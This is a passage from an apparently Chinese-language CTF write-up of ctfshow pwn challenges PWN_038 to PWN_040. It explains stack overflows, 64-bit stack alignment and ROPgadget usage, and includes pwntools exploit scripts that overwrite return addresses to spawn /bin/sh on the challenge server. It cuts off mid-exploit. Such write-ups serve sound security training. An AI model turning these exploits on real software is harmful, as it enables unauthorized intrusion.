+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/111.png&#34;
+	width=&#34;653&#34;
+	height=&#34;150&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/111_hu_557177fc9847835c.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/111_hu_3e2e3f6328afcdc.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;435&#34;
+		data-flex-basis=&#34;1044px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;buf数组距离ebp寄存器为0xAh，加上本身寄存器ebp的8字节。&lt;/p&gt;
+&lt;p&gt;跟进backdoor函数看到/bin/sh，本题思路和上题PWN_037一样，只不过架构变成64位而已。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/107.png&#34;
+	width=&#34;689&#34;
+	height=&#34;309&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/107_hu_8a3f21dfb544f975.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/107_hu_82558c987e30e4e0.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;上题backdoor函数的int类型&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;222&#34;
+		data-flex-basis=&#34;535px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/112.png&#34;
+	width=&#34;610&#34;
+	height=&#34;126&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/112_hu_7a50666a6534a184.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/112_hu_f2c44b968d3f43b7.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;本题的后门函数int_64&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;484&#34;
+		data-flex-basis=&#34;1161px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;blockquote class=&#34;alert alert-note&#34;&gt;
+    &lt;blockquote&gt;
+&lt;p&gt;64 位程序调用 &lt;code&gt;system&lt;/code&gt; 需考虑堆栈平衡，本质是 &lt;strong&gt;64 位 ABI 对 “栈对齐” 的硬性要求&lt;/strong&gt;—— 若不满足，函数执行时访问栈内存会崩溃；而 32 位 ABI 无此要求，仅需调用后清理参数栈即可，因此无需额外关注平衡。&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
+&lt;p&gt;所以说exp需要考虑到堆栈平衡加上ret返回地址：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/113.png&#34;
+	width=&#34;1198&#34;
+	height=&#34;261&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/113_hu_3770565c136ecdbb.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/113_hu_f3c84935d209b6bf.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;459&#34;
+		data-flex-basis=&#34;1101px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在实际解题中，&lt;code&gt;ret&lt;/code&gt; 地址需要针对当前题目动态获取，常用方法：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;工具查找&lt;/strong&gt;：用 &lt;code&gt;ROPgadget&lt;/code&gt; 工具直接搜索程序中的 &lt;code&gt;ret&lt;/code&gt; 指令（最常用）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary ./pwn &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep ret
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;exp：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28147&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;backdoor&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x400287&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 0x0000000000400287 : ret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xA&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ret&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;backdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;pwn_039&#34;&gt;PWN_039
+&lt;/h3&gt;&lt;p&gt;题目：32位的 system(); &amp;ldquo;/bin/sh&amp;rdquo;。 &lt;a class=&#34;link&#34; href=&#34;PWN_039&#34; &gt;PWN_039&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;checksec一下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/114.png&#34;
+	width=&#34;750&#34;
+	height=&#34;210&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/114_hu_ffd0edb80748b701.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/114_hu_ed469b05f80e7568.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;357&#34;
+		data-flex-basis=&#34;857px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到没开启canary、PIE保护的，存在可利用栈溢出漏洞的可能。&lt;/p&gt;
+&lt;p&gt;IDA：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/115.png&#34;
+	width=&#34;1000&#34;
+	height=&#34;450&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/115_hu_e696ee341380586.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/115_hu_a20ea7fd6a1243a2.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;32位的IDA分析&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;222&#34;
+		data-flex-basis=&#34;533px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;跟进ctfshow函数发现栈溢出：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/116.png&#34;
+	width=&#34;596&#34;
+	height=&#34;140&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/116_hu_1199a62a52d94a2a.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/116_hu_d138901c5d88e68e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;425&#34;
+		data-flex-basis=&#34;1021px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以读取50个字符给buf，但buf容量只有14，所以超过14就会造成栈溢出。&lt;/p&gt;
+&lt;p&gt;接着在函数目录看到hint函数有猫腻：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/117.png&#34;
+	width=&#34;854&#34;
+	height=&#34;390&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/117_hu_25ebd19a12518947.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/117_hu_27e696ef37eed855.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;218&#34;
+		data-flex-basis=&#34;525px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;那么大致的exp思路就来了：也就是先cyclic函数生成垃圾值覆盖局部变量和ebp寄存器本身；但是只有system函数和/bin/sh，却没有system(“/bin/sh”);的后门，所以我们只能构造出来。&lt;/p&gt;
+&lt;p&gt;在编写exp时，因为程序是32位，所以说不用去考虑它的堆栈平衡：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28216&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x8048750&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x12&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里的p32(0)等于4字节，可以用四个a或者cyclic(4)代替也行，这时32位下system函数的返回地址占位符，然后就到执行/bin/sh，那就是跳转到它的地址：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/118.png&#34;
+	width=&#34;1155&#34;
+	height=&#34;119&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/118_hu_e5e93807f34b7bdd.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/118_hu_875bb0d0ab4ca27d.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;/bin/sh字符串的地址&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;970&#34;
+		data-flex-basis=&#34;2329px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这样子我们就构造出system(&amp;quot;/bin/sh&amp;quot;);了，然后进入交互模式获得flag。&lt;/p&gt;
+&lt;p&gt;这题主要考察我们对于函数的构造以及函数地址的拼接、栈的结构组成。需要多看看我的PWN-2啊。。。。&lt;/p&gt;
+&lt;h3 id=&#34;pwn_040&#34;&gt;PWN_040
+&lt;/h3&gt;&lt;p&gt;题目：64位的 system(); &amp;ldquo;/bin/sh&amp;rdquo;。&lt;/p&gt;
+&lt;p&gt;IDA64位分析，跟进ctfshow函数：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/119.png&#34;
+	width=&#34;551&#34;
+	height=&#34;149&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/119_hu_4361ba4a461d934e.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/119_hu_d335e677bd05e71e.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;369&#34;
+		data-flex-basis=&#34;887px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;checksec看到未打开canary保护，而且在ctfshow函数这发现有栈溢出。&lt;/p&gt;
+&lt;p&gt;跟进hint函数，发现后门。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/120.png&#34;
+	width=&#34;540&#34;
+	height=&#34;125&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/120_hu_ac0e24a915fef2c8.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/120_hu_a859f06ba4c0b768.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;432&#34;
+		data-flex-basis=&#34;1036px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;用ROPgadget命令查询ret地址：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ROPgadget --binary ./pwn &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep ret
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/121.png&#34;
+	width=&#34;1224&#34;
+	height=&#34;450&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/121_hu_749e2c86a93f982a.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/121_hu_9f8cdc6270b0312a.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ret地址查询&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;272&#34;
+		data-flex-basis=&#34;652px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查询/bin/sh的地址：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/122.png&#34;
+	width=&#34;1135&#34;
+	height=&#34;105&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/122_hu_8e4f1859de6b1d4c.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/122_hu_772a3258af0a8472.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;/bin/sh的地址：0x400808&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1080&#34;
+		data-flex-basis=&#34;2594px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;exp：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
